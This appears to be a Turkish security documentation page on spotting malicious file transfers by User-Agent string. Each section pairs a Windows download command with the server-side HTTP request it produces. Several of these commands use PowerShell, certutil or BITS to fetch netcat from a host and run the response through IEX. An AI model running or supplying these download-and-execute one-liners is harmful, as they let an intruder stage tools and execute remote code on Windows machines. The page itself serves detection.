---
glightbox: true
icon: material/circle-small
---

# Detection

HTTP istemcileri en kolay şekilde, sunucunun kendisine hangi HTTP istemcisinin (Firefox, Chrome vb.) bağlandığını tanımlamak için kullandığı User-Agent dizesi tarafından tanınır. User-Agent dizelerinin bir listesini [burada](http://useragentstring.com/pages/useragentstring.php) bulabilirsiniz.

Kötü amaçlı dosya aktarımları da User-Agent dizesi tarafından tanınabilir. Bu bölümde verilen User-Agent dizeleri yaygın HTTP aktarım tekniklerinden gözlemlenmiştir (Windows 10 ve PowerShell 5 ile test edilmiştir).

## Invoke-WebRequest - Client

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

## Invoke-WebRequest - Server

```text
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

## WinHttpRequest - Client

```powershell
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1; $h.open('GET', 'http://10.10.10.32/nc.exe', $false); $h.send(); IEX $h.responseText
```

## WinHttpRequest - Server

```text
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

## Msxml2 - Client

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET', 'http://10.10.10.32/nc.exe', $false); $h.send(); IEX $h.responseText
```

## Msxml2 - Server

```text
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

## Certutil - Client

```batch
certutil -urlcache -split -f http://10.10.10.32/nc.exe
```

## Certutil - Server

```text
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

## BITS - Client

```powershell
Import-Module BitsTransfer; Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:TEMP\t; $r = Get-Content $env:TEMP\t; Remove-Item $env:TEMP\t; IEX $r
```

## BITS - Server

```text
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```
